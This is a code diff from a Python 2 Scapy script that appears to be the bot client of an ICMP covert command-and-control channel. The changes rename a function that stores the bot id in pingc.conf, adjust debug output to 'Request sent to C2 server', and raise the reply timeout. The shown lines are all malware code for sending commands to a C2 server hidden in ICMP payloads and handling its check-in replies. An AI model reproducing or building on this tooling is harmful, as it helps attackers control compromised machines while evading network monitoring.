@@ -23,7 +23,7 @@ def getId():
 	#print "[D] Return id: " + id
 	return id	
 
-def collectId(botId):
+def retrieveId(botId):
 	#print "[D] Writing bot Id: ",botId
 	conf_file = open('pingc.conf','w')
 	idstr="id="+str(botId)
@@ -36,10 +36,10 @@ def handler(signum, frame):
 
 def sendPingRequest(command):
 	packet=IP(dst=sys.argv[1])/ICMP()/str(command)
-        packet.show()
-        p=sr1(packet,timeout=5)
+        #packet.show()
+        print "[*] Request sent to C2 server: " + command
+	p=sr1(packet,timeout=10)
         #p.show()
-	print "[*] String sent to C2 server: " + command
 	if p:
 		return p
 	else:
@@ -87,7 +87,7 @@ def processReply(p):
                 processReply(p)
 	elif 'id=' in response:
 		print "[*] Checked in...placing id in conf file"
-		collectId(response[3:])
+		retrieveId(response[3:])
 
 def main(argv):
 	id = getId()
